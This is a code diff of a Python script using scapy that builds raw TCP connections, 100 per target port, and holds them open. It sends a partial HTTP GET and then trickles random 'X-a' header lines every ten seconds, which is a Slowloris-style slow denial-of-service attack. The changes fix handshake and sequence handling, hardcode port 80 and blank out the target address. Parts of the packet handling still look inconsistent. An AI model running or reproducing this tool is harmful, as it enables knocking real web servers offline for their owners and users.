@@ -3,6 +3,7 @@ import threading
 import time
 import random
 from scapy.all import *
+print('Start')
 
 class Connection():
 	def __init__(self, thread, src_port, dst_ip, dst_port):
@@ -28,28 +29,30 @@ def ports_scanner(dst_ip):
 
 def create_connection(src_port, dst_ip, dst_port, user_agent):
 		
-		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='S', seq=random(0, 4294967295))
+		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='S', seq=random.randint(0, 4294967295))
 		response = sr1(packet, verbose=False)
 		
-		if response.flags == 'SA':
-			packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response.ack, ack=response.seq+1)
+		if response[1].flags == 'SA': #ACK SYN
+			packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response[1].ack, ack=response[1].seq+1)
 			response = sr1(packet, verbose=False)
-		elif response.flags == 'R':
+		elif response[1].flags == 'R': #RST
 			pass
-		
+
 		time.sleep(10)
-		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response.ack, ack=response.seq)
+
+		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response[1].ack, ack=response[1].seq)
 		data = 'GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(user_agent) + "{}\r\n".format("Accept-language: en-US,en,q=0.5")
-		response = sr1(packet/data, verbose=False)
+		response = sr1(packet/data, verbose=True)
+		print(response[1].flags)
 		
 		while True:
 			time.sleep(10)
-			if response.flags == 'A':
-				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response.ack, ack=response.seq)
+			if response[1].flags == 'A': #ACK
+				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response[1].ack, ack=response[1].seq)
 				data = 'X-a: {}\r\n'.format(random.randint(0, 5000))
 				response = sr1(packet/data, verbose=False)
-			elif response.flags == 'FA':
-				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response.ack, ack=response.seq+1)
+			elif response[1].flags == 'FA': #FIN ACK
+				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response[1].ack, ack=response[1].seq+1)
 				break
 
 def free_ports_init():
@@ -59,7 +62,7 @@ def free_ports_init():
 	return free_ports
 
 def start(dst_ip):
-	open_ports = ports_scanner(dst_ip)
+	#open_ports = ports_scanner(dst_ip)
 	free_ports = free_ports_init()
 	connections = list()
 	user_agents = [
@@ -89,7 +92,7 @@ def start(dst_ip):
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
-	for dst_port in open_ports:
+	for dst_port in [80]:
 		for i in range(100):
 			src_port = random.choice(free_ports)
 			free_ports.remove(src_port)
@@ -97,9 +100,7 @@ def start(dst_ip):
 			thread.start()
 			connection = Connection(thread, src_port, dst_ip, dst_port)
 			connections.append(connection)
-			print(i)
-
 
 
 if __name__ == '__main__':
-	start('localhost')
+	start('')
